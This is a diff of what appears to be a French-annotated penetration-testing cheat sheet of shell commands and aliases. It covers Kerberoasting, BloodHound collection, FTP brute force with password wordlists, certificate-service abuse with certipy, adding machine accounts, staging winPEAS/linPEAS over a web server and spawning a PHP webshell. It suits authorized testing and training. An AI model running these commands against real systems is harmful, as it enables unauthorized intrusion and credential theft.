@@ -1,11 +1,11 @@
-xfreerdp /u:$USER /d:$DOMAINE /v:$IP /p:'$PASSWORD' /kbd:0x0000040C #xfreerdp avec langue FR
+xfreerdp /u:$USER /d:$DOMAINE /v:$IP /p:$PASSWORD /kbd:0x0000040C #xfreerdp avec langue FR
 nmap -sU --min-rate 5000 -p- $TARGET #Nmap UDP rapide
 linfast # Téléchargement de winpeas + création serveur web + copie commande iwr avec Ip dans le presse papier
 winfast # Téléchargement de linpeas + création serveur web + copie commande wget avec Ip dans le presse papier
 bloodhound.py -d '$DC' -u '$USER' -p '$PASSWORD' -c all -ns $IP #collecteur pour BH directement depuis l'host
 mssqlclient.py <user>@<FQDN/IP> -windows-auth #connexion mssql
 GetUserSPNs.py -request -dc-ip 192.168.50.70 corp.com/USER #Kerberoasting 
-certipy find -vulnerable -u "$USER@$DOMAIN" -p "$PASSWORD" -stdout
+certipy find -vulnerable -u $USER@$DOMAIN -p $PASSWORD -stdout
 medusa -U '/opt/seclists/Usernames/top-usernames-shortlist.txt' -P /opt/seclists/Passwords/500-worst-passwords.txt -t 4 -e ns -n 21 -O '/workspace/resultFTPMedusa.txt' -M ftp -h $IP
 gobuster vhost -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u $TARGET -t 50 --append-domain # Recherche de vhosts avec Gobuster
 runsmbserv #Lance un serveur smb et copie la commande dans le presseP
@@ -13,6 +13,6 @@ phpshell #Pour avoir un webshell php
 settarget IP #Attention faire source ~/.zshrc aprés
 alias ssh ='ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
 certipy auth -pfx fichier.pfx -dc-ip $IP
-nxc smb "$IP" -u '$USER' -p '$PASSWORD'
+nxc smb $IP -u $USER -p $PASSWORD
 addcomputer.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP
 
